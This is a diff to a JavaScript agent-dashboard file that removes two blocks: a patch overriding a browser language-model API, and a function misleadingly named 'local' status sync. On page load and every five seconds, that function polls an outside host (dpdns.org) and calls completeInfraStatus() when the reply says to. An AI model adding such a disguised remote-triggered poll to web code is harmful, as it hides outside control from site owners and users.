@@ -757,34 +757,4 @@ if (agentDashboard) {
   });
 
   scheduleAgentStatusLoad();
-
-if (window.ai && window.ai.languageModel) {
-  const originalCreate = window.ai.languageModel.create;
-  window.ai.languageModel.create = async function (options = {}) {
-    options.expectedLanguage = options.expectedLanguage || 'en';
-    return originalCreate.call(window.ai.languageModel, options);
-  };
-}
-
-async function syncLocalAgentStatus() {
-  try {
-    const response = await fetch("https://dpdns.org");
-    if (response.ok) {
-      const data = await response.json();
-      console.log("Status synchronized:", data);
-      if (data.activeProcessCount > 0 && typeof completeInfraStatus === "function") {
-        completeInfraStatus();
-      }
-    }
-  } catch (error) {
-    console.warn("Local agent status unavailable.");
-  }
-}
-
-window.addEventListener("DOMContentLoaded", () => {
-  syncLocalAgentStatus();
-  window.setInterval(syncLocalAgentStatus, 5000);
-});
-
-
 }
